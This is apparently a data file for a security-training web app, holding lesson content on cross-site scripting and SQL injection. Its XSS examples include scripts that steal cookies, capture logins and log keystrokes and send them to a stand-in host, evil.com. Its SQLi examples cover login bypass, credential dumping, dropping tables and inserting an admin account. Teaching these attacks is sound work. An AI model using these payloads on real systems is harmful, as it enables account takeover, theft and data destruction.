export const LEARN_CONTENT = {
  xss: {
    title: "Cross-Site Scripting (XSS)",
    color: "cyan",
    sections: [
      {
        type: "intro",
        heading: "What is XSS?",
        body: "Cross-Site Scripting (XSS) lets an attacker inject their own JavaScript into a webpage that other users visit. Instead of attacking the server directly, you're attacking the people using the site.",
      },
      {
        type: "flow",
        heading: "How does it work?",
        steps: [
          { icon: "🧑‍💻", label: "Attacker", detail: "Types malicious script into an input field" },
          { icon: "🌐",    label: "Server",   detail: "Saves or reflects the input without sanitizing it" },
          { icon: "👤",    label: "Victim",   detail: "Loads the page — the script runs in their browser" },
          { icon: "💀",    label: "Exploit",  detail: "Cookies stolen, page defaced, keystrokes logged" },
        ],
      },
      {
        type: "code",
        heading: "What a basic payload looks like",
        language: "html",
        code: `<!-- Normal comment input -->
<input value="Hello!" />

<!-- XSS payload injected instead -->
<input value=""><script>alert('XSS')</script>" />

<!-- The browser sees and executes the script -->`,
      },
      {
        type: "injection",
        heading: "How injection works",
        before: {
          label: "Server template (vulnerable)",
          code: `<div class="comment">\n  {userInput}\n</div>`,
          highlight: "{userInput}",
          caption: "The server pastes the user's input directly into the HTML — no cleaning, no escaping.",
        },
        after: {
          label: "What the browser receives",
          code: `<div class="comment">\n  <script>alert('xss')</script>\n</div>`,
          highlight: "<script>alert('xss')</script>",
          caption: "The browser sees a real script tag and executes it immediately — it has no way to tell it wasn't always there.",
        },
      },
      {
        type: "cards",
        heading: "Why is it dangerous?",
        items: [
          {
            icon: "🍪",
            title: "Cookie Theft",
            side: "left",
            body: "Steal session cookies to log in as the victim.",
            code: `// Injected into a vulnerable page
<script>
  // Grab the victim's session cookie
  const stolen = document.cookie;

  // Send it to the attacker's server
  fetch("https://evil.com/steal?c=" + stolen);
</script>`,
          },
          {
            icon: "🎣",
            title: "Phishing",
            side: "right",
            body: "Inject fake login forms to capture credentials.",
            code: `// Injected into a vulnerable page
<script>
  // Replace the page with a fake login form
  document.body.innerHTML = \`
    <form action="https://evil.com/capture">
      <p>Session expired. Please log in again.</p>
      <input name="user" placeholder="Username" />
      <input name="pass" placeholder="Password" type="password"/>
      <button>Login</button>
    </form>
  \`;
</script>`,
          },
          {
            icon: "🖥️",
            title: "Page Defacement",
            side: "left",
            body: "Modify what the victim sees on the page.",
            code: `// Injected into a vulnerable page
<script>
  // Wipe the entire page content
  document.body.innerHTML = \`
    <div style="background:#000;color:red;
                font-size:48px;text-align:center">
      <br/><br/>
      💀 You've been hacked 💀
    </div>
  \`;
</script>`,
          },
          {
            icon: "⌨️",
            title: "Keylogging",
            side: "right",
            body: "Record every keystroke the victim types.",
            code: `// Injected into a vulnerable page
<script>
  let log = "";

  // Listen to every key the victim presses
  document.addEventListener("keydown", (e) => {
    log += e.key;

    // Send to attacker every 5 seconds
    if (log.length % 20 === 0) {
      fetch("https://evil.com/keys?k=" + log);
    }
  });
</script>`,
          },
        ],
      },
      {
        type: "types",
        heading: "Three types of XSS",
        items: [
          { name: "Reflected",  color: "yellow", desc: "Payload is in the URL. Only affects users who click the crafted link." },
          { name: "Stored",     color: "orange", desc: "Payload is saved to the database. Affects every user who loads the page." },
          { name: "DOM-based",  color: "red",    desc: "Payload manipulates the page's DOM directly via JavaScript." },
        ],
      },
      {
        type: "cta",
        heading: "Ready to practice?",
        body: "You'll start with reflected XSS — the simplest form. Your goal is to inject a script into a vulnerable comment board.",
      },
    ],
  },

  sqli: {
    title: "SQL Injection (SQLi)",
    color: "orange",
    sections: [
      {
        type: "intro",
        heading: "What is SQL Injection?",
        body: "SQL Injection happens when a website pastes user input directly into a database query. By typing carefully crafted text, an attacker can change what the query does — bypass logins, dump entire tables, or destroy data. Where XSS attacks other users in the browser, SQLi attacks the database itself.",
      },
      {
        type: "flow",
        heading: "How does it work?",
        steps: [
          { icon: "🧑‍💻", label: "Attacker", detail: "Types crafted SQL into a form field, search box, or URL parameter" },
          { icon: "🌐",    label: "Server",   detail: "Pastes the input directly into a SQL string instead of using a parameter" },
          { icon: "🗄️",    label: "Database", detail: "Executes the rewritten query as one trusted command" },
          { icon: "💀",    label: "Exploit",  detail: "Login bypassed, tables dumped, data deleted, admin row inserted" },
        ],
      },
      {
        type: "code",
        heading: "What a basic payload looks like",
        language: "sql",
        filename: "login.sql",
        code: `-- The query the developer wrote (username + password from the form)
SELECT * FROM users
WHERE username = 'alice' AND password = 'hunter2';

-- Attacker types this into the username field: admin' --
-- The server pastes it in without escaping the quote:
SELECT * FROM users
WHERE username = 'admin' --' AND password = '';
--                       ^^ everything after -- is ignored as a comment

-- The query now returns the admin row without checking any password.`,
      },
      {
        type: "cards",
        heading: "Why is it dangerous?",
        items: [
          {
            icon: "🔓",
            title: "Authentication Bypass",
            side: "left",
            language: "sql",
            filename: "bypass.sql",
            body: "Log in as any user without knowing their password.",
            code: `-- Username field gets:    admin' --
-- Final query the database sees:

SELECT * FROM users
WHERE username = 'admin' --' AND password = '';

-- The "--" comments out the password check.
-- Server gets back the admin row → you are logged in as admin.`,
          },
          {
            icon: "📤",
            title: "Data Exfiltration",
            side: "right",
            language: "sql",
            filename: "dump.sql",
            body: "Dump tables you should never have access to.",
            code: `-- Search box query:
SELECT name, price FROM products WHERE name LIKE '%shoes%';

-- Attacker types:    ' UNION SELECT username, password FROM users --

SELECT name, price FROM products WHERE name LIKE '%'
UNION SELECT username, password FROM users --%';

-- The page now lists every username and password
-- alongside the normal product results.`,
          },
          {
            icon: "💥",
            title: "Database Destruction",
            side: "left",
            language: "sql",
            filename: "destroy.sql",
            body: "Wipe entire tables with one crafted input.",
            code: `-- Comment ID from URL:    ?id=42
DELETE FROM comments WHERE id = 42;

-- Attacker changes the URL to:    ?id=42; DROP TABLE users--

DELETE FROM comments WHERE id = 42;
DROP TABLE users;
--

-- Two statements run back-to-back. The users table is gone.`,
          },
          {
            icon: "👑",
            title: "Privilege Escalation",
            side: "right",
            language: "sql",
            filename: "escalate.sql",
            body: "Insert your own row into the admin table.",
            code: `-- Sign-up form sends username + email
INSERT INTO users (username, email, role)
VALUES ('bob', 'bob@x.com', 'user');

-- Attacker types this as the email:
--    x'); INSERT INTO users VALUES ('me','me@x.com','admin') --

INSERT INTO users (username, email, role)
VALUES ('bob', 'x'); INSERT INTO users VALUES
('me','me@x.com','admin') --', 'user');

-- A second INSERT runs — creating an admin account they own.`,
          },
        ],
      },
      {
        type: "types",
        heading: "Three types of SQL Injection",
        items: [
          { name: "Classic",    color: "yellow", desc: "Results come straight back in the page. Easiest to exploit — you can see what the database returns." },
          { name: "Blind",      color: "orange", desc: "No visible output. The attacker asks yes/no questions and infers data from how the page changes." },
          { name: "Time-based", color: "red",    desc: "No output, no errors. The attacker uses SLEEP() and measures response time to extract one bit at a time." },
        ],
      },
      {
        type: "cta",
        heading: "Ready to practice?",
        body: "You'll start with a classic SQLi login bypass. Your goal is to log in as the admin without knowing the password.",
      },
    ],
  },
};
